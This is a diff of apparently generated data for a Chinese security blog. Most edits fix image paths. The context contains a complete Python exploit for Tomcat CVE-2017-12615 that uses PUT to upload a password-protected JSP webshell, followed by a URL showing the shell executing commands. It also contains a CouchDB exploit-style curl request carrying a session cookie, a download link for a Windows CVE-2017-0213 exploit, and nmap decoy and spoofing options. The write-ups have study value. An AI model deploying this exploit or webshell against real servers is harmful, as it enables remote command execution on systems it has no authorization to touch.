+<figure class="highlight plain"><figcaption><span>-X POST '<http: 192.168.199.181:5984 teeest _temp_view?limit< span></http:></span></figcaption><table><tr><td class="code"><pre><span class="line">curl -X POST &#39;&lt;http:&#x2F;&#x2F;192.168.199.181:5984&#x2F;teeest&#x2F;_temp_view?limit&#x3D;11&gt;&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;  -H &quot;Cookie: AuthSession&#x3D;YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4&quot;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -884,7 +884,7 @@
 <p>​        <strong>影响范围：</strong>Apache Tomcat 7.0.0-7.0.81（Apache Tomcat 8.X  Apache Tomcat 9.X 不受影响）</p>
 <p>​    <strong>漏洞分析：</strong>在Tomcat安装目录下的配置文件web.xml中的<strong><u>org.apache.catalina.servlets.DefaultServlet</u></strong> 方法下如果该方法有如下代码，即表示Tomcat已开启PUT方法</p>
 <a id="more"></a>
-<p><img src="%5Cimages%5CCVE-2017-12615%5C1.png" alt="1"></p>
+<p><img src="/2018/12/20/CVE-2017-12615/%5Cimages%5CCVE-2017-12615%5C1.png" alt="1"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;init-param&gt; </span><br><span class="line">      &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt; </span><br><span class="line">      &lt;param-value&gt;false&lt;&#x2F;param-value&gt; </span><br><span class="line">&lt;&#x2F;init-param&gt;</span><br></pre></td></tr></table></figure>
 
 <p>然后可以通过PUT方法上传一句话</p>
@@ -894,7 +894,7 @@
 
 <p>​    还是<strong>web.xml</strong>目录，确保readonly的参数为true（默认值），即不允许DELETE和PUT操作</p>
 <h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>1、查看Tomcat版本号</p>
-<p><img src="%5Cimages%5CCVE-2017-12615%5C2.png" alt="2"></p>
+<p><img src="/2018/12/20/CVE-2017-12615/%5Cimages%5CCVE-2017-12615%5C2.png" alt="2"></p>
 <p>该版本存在Tomcat远程代码执行漏洞</p>
 <p>2、下载Payload</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! -*- coding:utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">body = <span class="string">'''&amp;lt;%@ page language=&amp;quot;java&amp;quot; import=&amp;quot;java.util.*,java.io.*&amp;quot; pageEncoding=&amp;quot;UTF-8&amp;quot;%&amp;gt;&amp;lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+&amp;quot;\\n&amp;quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&amp;gt;&amp;lt;%if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))&amp;amp;&amp;amp;!&amp;quot;&amp;quot;.equals(request.getParameter(&amp;quot;cmd&amp;quot;)))&#123;out.println(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;+excuteCmd(request.getParameter(&amp;quot;cmd&amp;quot;))+&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);&#125;else&#123;out.println(&amp;quot;:-)&amp;quot;);&#125;%&amp;gt;'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    conn.request(method=<span class="string">'OPTIONS'</span>, url=<span class="string">'/ffffzz'</span>)</span><br><span class="line"></span><br><span class="line">    headers = dict(conn.getresponse().getheaders())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'allow'</span> <span class="keyword">in</span> headers <span class="keyword">and</span> \</span><br><span class="line"></span><br><span class="line">       headers[<span class="string">'allow'</span>].find(<span class="string">'PUT'</span>) &amp;gt; <span class="number">0</span> :</span><br><span class="line"></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">        conn = httplib.HTTPConnection(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">        url = &amp;quot;/&amp;quot; + str(int(time.time()))+<span class="string">'.jsp/'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#url = &amp;quot;/&amp;quot; + str(int(time.time()))+'.jsp::$DATA'</span></span><br><span class="line"></span><br><span class="line">        conn.request( method=<span class="string">'PUT'</span>, url= url, body=body)</span><br><span class="line"></span><br><span class="line">        res = conn.getresponse()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res.status  == <span class="number">201</span> :</span><br><span class="line"></span><br><span class="line">            <span class="comment">#print 'shell:', 'http://' + sys.argv[1] + url[:-7]</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'shell:'</span>, <span class="string">'http://'</span> + sys.argv[<span class="number">1</span>] + url[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> res.status == <span class="number">204</span> :</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'file exists'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'error'</span></span><br><span class="line"></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Server not vulnerable'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception,e:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error:'</span>, e</span><br></pre></td></tr></table></figure>
@@ -902,11 +902,11 @@
 
 
 <p>3、利用payload对网站进行恶意访问</p>
-<p><img src="%5Cimages%5CCVE-2017-12615%5C3.png" alt="3"></p>
+<p><img src="/2018/12/20/CVE-2017-12615/%5Cimages%5CCVE-2017-12615%5C3.png" alt="3"></p>
 <p>执行后返回webshell的地址，访问</p>
 <p><code>http://171.xx.xx.x:8080/1545287081.jsp?&amp;pwd=023&amp;cmd=ipconfig</code></p>
 <p>即可执行命令</p>
-<p><img src="%5Cimages%5CCVE-2017-12615%5C4.png" alt="4"></p>
+<p><img src="/2018/12/20/CVE-2017-12615/%5Cimages%5CCVE-2017-12615%5C4.png" alt="4"></p>
 ]]></content>
       <categories>
         <category>漏洞</category>
@@ -923,7 +923,7 @@
 <p><strong>理论上，COM可以被移植到任何操作系统上，但是现实中COM依然只是Windows世界的东西</strong></p>
 <h4 id="二、漏洞介绍"><a href="#二、漏洞介绍" class="headerlink" title="二、漏洞介绍"></a>二、漏洞介绍</h4><p>​    参考文章：<a href="http://www.voidcn.com/article/p-ukjxxpit-boa.html" target="_blank" rel="noopener">http://www.voidcn.com/article/p-ukjxxpit-boa.html</a> </p>
 <p>漏洞影响版本：</p>
-<p><img src="%5Cimages%5CCVE-2017-0213%5C1.png" alt="1"></p>
+<p><img src="/2018/12/11/CVE-2017-0213(COM%20%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E6%BC%8F%E6%B4%9E)/%5Cimages%5CCVE-2017-0213%5C1.png" alt="1"></p>
 <p>漏洞利用工具下载地址：<a href="https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213" target="_blank" rel="noopener">https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213</a></p>
 <p>漏洞利用：</p>
 <p><img src="https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/CVE-2017-0213/win10.png" alt="img"> </p>
@@ -1029,7 +1029,7 @@
 <p>​                        <strong>ObjectOutputStream类的writeObject()方法可以实现序列化。</strong> </p>
 <p>​                        <strong>ObjectInputStream类的readObject()方法用于反序列化。</strong> </p>
 <a id="more"></a>
-<p><img src="%5Cimages%5Cjava%5C1.png" alt="1"></p>
+<p><img src="/2018/11/04/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5Cimages%5Cjava%5C1.png" alt="1"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">序列化与反序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。</span><br></pre></td></tr></table></figure>
 
 <h4 id="用途："><a href="#用途：" class="headerlink" title="用途："></a>用途：</h4><p>​        ①把对象的字节序列永久保存在硬盘上，通常存放在一个文件中；</p>
@@ -1079,7 +1079,7 @@
 
 
 
-<p><strong>object.out文件如下</strong> <img src="%5Cimages%5Cjava%5C2.png" alt="2"></p>
+<p><strong>object.out文件如下</strong> <img src="/2018/11/04/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5Cimages%5Cjava%5C2.png" alt="2"></p>
 <p>注：上图中0000000h-000000c0h表示行号；0-f表示列；行后面的文字表示对这行16进制的解释 </p>
 <p><strong>Java反序列化漏洞由来：</strong></p>
 <p>1、由于很多站点或者RMI仓库等接口处存在java的反序列化功能，攻击者可以通过构造特定的恶意对象序列化后的流，让目标反序列化，从而达到自己的恶意预期行为，包括命令执行，甚至getshell等等。</p>
@@ -1095,7 +1095,7 @@
     <url>/2018/10/26/Nmap/</url>
     <content><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>Nmap是一款强大的安全扫描器，用于探测计算机网络中的主机，服务以及开放端口。它有很多特性，比如隐形扫描(stealth scan)，主动扫描(aggressive scan)，防火墙规避扫描(firewall evasio scan)，而且能够识别操作系统。它有自己的Nmap脚本引擎，利用该引擎，可以借助Lua编程语言开发自定义的脚本程序。</p>
 <h4 id="一-名称"><a href="#一-名称" class="headerlink" title="一.名称"></a>一.名称</h4><p>nmap-网络探测和安全扫描工具</p>
-<h4 id="二-语法"><a href="#二-语法" class="headerlink" title="二.语法"></a>二.语法</h4><p>nmap   &lt;Scan Type(s)&gt;   <Options></p>
+<h4 id="二-语法"><a href="#二-语法" class="headerlink" title="二.语法"></a>二.语法</h4><p>nmap   &lt;Scan Type(s)&gt;   <Options></Options></p>
 <a id="more"></a>
 <h4 id="三-描述"><a href="#三-描述" class="headerlink" title="三.描述"></a>三.描述</h4><p>nmap是一个网络探测和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取那台主机正在运行以及提供什么服务等信息。nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。从扫描类型一节可以得到细节。nmap还提供了一些高级的特征，例如：通过TCP/IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口影射)，碎片扫描，以及灵活的目标和端口设定。 </p>
 <p>nmap运行通常会得到被扫描主机端口的列表。nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止 nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙/包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。</p>
@@ -1157,7 +1157,7 @@
 <p>还要注意：一些愚蠢的端口扫描检测软件会拒绝路由试图进行端口扫描的主机。因而，你需要让目标主机和一些诱饵断开连接。如果诱饵是目标主机的网关或者就是其自己时，会给目标主机造成很大问题。所以你需要慎重使用这个选项。</p>
 <p>诱饵扫描既可以在起始的ping扫描也可以在真正的扫描状态下使用。它也可以和-O选项组合使用。</p>
 <p>使用太多的诱饵扫描能够减缓你的扫描速度甚至可能造成扫描结果不正确。同时，有些ISP会把你的欺骗包过滤掉。虽然现在大多数的ISP不会对此进行限制。</p>
-<p>-S <IP_Address></p>
+<p>-S <IP_Address></IP_Address></p>
 <p>在一些情况下，nmap可能无法确定你的源地址(nmap会告诉你)。在这种情况下，可以使用这个选项给出你的IP地址。</p>
 <p>在欺骗扫描时，也使用这个选项。使用这个选项可以让目标认为是其它的主机对自己进行扫描。</p>
 <p>-e</p>
@@ -1562,7 +1562,7 @@
 
 <p>函数介绍：</p>
 <p><strong>strip_tags()*</strong></p>
-<p>函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。</p>
+<p>函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。</b></p>
 <p><strong>addslashes()</strong></p>
 <p>函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p>
 <p>代码分析：</p>
